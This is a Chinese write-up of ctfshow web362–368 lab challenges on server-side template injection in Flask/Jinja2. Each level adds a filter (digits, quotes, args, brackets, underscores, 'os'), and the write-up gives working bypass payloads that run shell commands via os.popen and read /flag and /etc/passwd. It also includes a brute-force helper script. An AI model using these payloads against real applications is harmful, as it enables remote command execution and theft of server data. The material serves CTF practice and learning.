### ctfshow web362
随便试了试没发现过滤了啥
然后提交一下上一道题的payload，失败了 回显一个哭脸
查了一下 原来是过滤了数字
又查了查ssti过滤数字，找到了一个数字替换的脚本
将数字替换成全角数字
    def half2full(half):  
        full = ''  
        for ch in half:  
            if ord(ch) in range(33, 127):  
                ch = chr(ord(ch) + 0xfee0)  
            elif ord(ch) == 32:  
                ch = chr(0x3000)  
            else:  
                pass  
            full += ch  
        return full  
    t=''
    s="0123456789"
    for i in s:
        t+='\''+half2full(i)+'\','
    print(t)
替换完了之后的payload
    ?name={{"".__class__.__bases__[０].__subclasses__()[１３２].__init__.__globals__['popen']('cat /flag').read()}}
    ctfshow{90be8203-4e24-458f-8fc9-14062aed72c8}
然后再看别的大佬写的wp的时候发现362和363可以用一个payload提交
    Payload:?name={{lipsum.__globals__.__getitem__("os").popen("cat /flag").read()}}
### ctfshow web363
测试发现过滤了引号
如何绕过呢？下面来自[Python模板注入(SSTI)深入学习 - 先知社区
(aliyun.com)](https://xz.aliyun.com/t/6885#toc-4)
* * *
#### 过滤引号
回顾我们上面的payload，哪里使用了引号？
[
接下来思考对应的解决办法，首先第一个引号的作用是什么，是为了引出基类，而任何数据结构都可以引出基类，所以这里可以直接使用数组代替，所以上述payload就变成了：
    {{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__["os"]["popen"]("whoami").read()}}
在fuzz的时候我发现，数据结构可以被替换为数组、字典，以及`数字0`。
再看看后面的引号是用来干嘛的，首先看看. **init** . **globals** 返回的是什么类型的数据:
[
所以第一个引号就是获取字典内对应索引的value，这里我们可以使用request.args来绕过此处引号的过滤。
request.args是flask中一个存储着请求参数以及其值的字典，我们可以像这样来引用他：
[
所以第二个引号的绕过方法即：
    {{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[request.args.arg1]}}&arg1=os
后面的所有引号都可以使用该方法进行绕过。
还有另外一种绕过引号的办法，即通过python自带函数来绕过引号，这里使用的是chr()。
首先fuzz一下chr()函数在哪：
payload：
    {{().__class__.__bases__[0].__subclasses__()[§0§].__init__.__globals__.__builtins__.chr}}
[
通过payload爆破subclasses，获取某个subclasses中含有chr的类索引，可以看到爆破出来很多了，这里我随便选一个。
    {%set+chr=[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%}
接着尝试使用chr尝试绕过后续所有的引号：
    {%set+chr=[].__class__.__bases__[0].__subclasses__()[77].__init__.__globals__.__builtins__.chr%}{{[].__class__.__mro__[1].__subclasses__()[300].__init__.__globals__[chr(111)%2bchr(115)][chr(112)%2bchr(111)%2bchr(112)%2bchr(101)%2bchr(110)](chr(108)%2bchr(115)).read()}}
[
* * *
假设传入`{{ config.__class__.__init__.__globals__['os']
}}`,因为引号被过滤，所以无法执行，可以把`'os'`换成`request.args.a`(这里的a可以理解为自定义的变量，名字可以任意设置)
随后在后面传入a的值，变成`{{ config.__class__.__init__.__globals__[request.args.a]
}}&a=os`，与原命令等效
Payload:  
比如我们要构造`?name={{ config.__class__.__init__.__globals__['os'].popen('cat
../flag').read() }}`，但是引号不能使用了，就可以把这两处使用引号的地方替换掉，最终变成  
`?name={{
config.__class__.__init__.__globals__[request.args.a].popen(request.args.b).read()
}}&a=os&b=cat ../flag`  
### ctfshow web364
这个题过滤了单双引号，args，所以上一题的思路无法沿用 换个方法
咋绕过呢，看到了sp4c1ous师傅的文章
* * *
**利用request对象绕过**
    {{().__class__.__bases__[0].__subclasses__().pop(40)(request.args.path).read()}}&path=/etc/passwd
    #像下面这样就可以直接利用了
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__[request.args.os].popen(request.args.cmd).read()}}&os=os&cmd=ls /
**等同于：**
    {{().__class__.__bases__[0].__subclasses__().pop(40)('/etc/passwd').read()}}
    ​
    {{().__class__.__base__.__subclasses__()[77].__init__.__globals__['os'].popen('ls /').read()}}
**如果过滤了**`args`，可以将其中的`request.args`改为`request.values`，POST和GET两种方法传递的数据`request.values`都可以接收。
* * *
按照大佬的方法做个payload
    ?name={{lipsum.__globals__.os.popen(request.values.gg).read()}}&gg=cat /flag
    ctfshow{2e39f741-f60e-4cb9-a889-00441ac46737}
看了一下别人的wp，还可以用cookie绕过
利用bp抓包然后传入cookie的值
效果一样
### ctfshow web365
字符串拼接绕过
应该是过滤了单双引号，args，[]
中括号可以用点或者`__getitem__`绕过
通过`__getitem__()`构造任意字符，比如
    ?name={{config.__str__().__getitem__(22)}}   # 就是22
整个脚本
    import requests
    url="http://967b7296-6f76-444e-83d3-519ce6624dea.challenge.ctf.show/?name={{config.__str__().__getitem__(%d)}}"
    payload="cat /flag"
    result=""
    for j in payload:
        for i in range(0,1000):
            r=requests.get(url=url%(i))
            location=r.text.find("")
            word=r.text[location+4:location+5]
            if word==j:
                print("config.__str__().__getitem__(%d) == %s"%(i,j))
                result+="config.__str__().__getitem__(%d)~"%(i)
                break
    print(result[:len(result)-1])
得到
    config.__str__().__getitem__(22) == c
    config.__str__().__getitem__(40) == a
    config.__str__().__getitem__(23) == t
    config.__str__().__getitem__(7) ==  
    config.__str__().__getitem__(279) == /
    config.__str__().__getitem__(4) == f
    config.__str__().__getitem__(41) == l
    config.__str__().__getitem__(40) == a
    config.__str__().__getitem__(6) == g
构造payload
    ?name={{url_for.__globals__.os.popen(config.__str__().__getitem__(22)~config.__str__().__getitem__(40)~config.__str__().__getitem__(23)~config.__str__().__getitem__(7)~config.__str__().__getitem__(279)~config.__str__().__getitem__(4)~config.__str__().__getitem__(41)~config.__str__().__getitem__(40)~config.__str__().__getitem__(6)
    ).read()}}
方法二：values传参
    # values 没有被过滤
    ?name={{lipsum.__globals__.os.popen(request.values.ocean).read()}}&ocean=cat /flag
方法三：cookie传参
    # cookie 可以使用
    ?name={{url_for.__globals__.os.popen(request.cookies.c).read()}}
    Cookie:c=cat /flag
### ctfshow web366
过滤了单双引号，args，[]，_，os
单双引号可以用request对象绕过，由于过滤了args，所以我们用request.values来绕过
过滤了[]我们用|attr()来绕过
过滤_我们也用request对象来绕过
os我们可以用编码来绕过
payload
    ?name={{lipsum|attr(request.values.a)|attr(request.values.b)(request.values.c)|attr(request.values.d)(request.values.ocean)|attr(request.values.f)()}}&ocean=cat /flag&a=__globals__&b=__getitem__&c=os&d=popen&f=read
    ctfshow{0c9d868e-81c8-4c30-a2d4-534e5e17e8b6}
### ctfshow web367
过滤了单双引号、args、中括号[]、下划线、os
和上一个差不多，直接原payload提交
### ctfshow web368
过滤单双引号、args、中括号[]、下划线、os、{undefined{undefined
不能使用`{{`来进行提交了，但是我们可以用`{%`来进行绕过
    ?name={%print(lipsum|attr(request.values.a)).get(request.values.b).popen(request.values.c).read() %}&a=__globals__&b=os&c=cat /flag
第二种也可以采用盲注的办法，写个脚本跑一下
基础太差，找个脚本跑一下吧
    def search(obj, max_depth):
        visited_clss = []
        visited_objs = []
        def visit(obj, path='obj', depth=0):
            yield path, obj
            if depth == max_depth:
                return
            elif isinstance(obj, (int, float, bool, str, bytes)):
                return
            elif isinstance(obj, type):
                if obj in visited_clss:
                    return
                visited_clss.append(obj)
                #print(obj) Enumerates the objects traversed
            else:
                if obj in visited_objs:
                    return
                visited_objs.append(obj)
            # attributes
            for name in dir(obj):
                try:
                    attr = getattr(obj, name)
                except: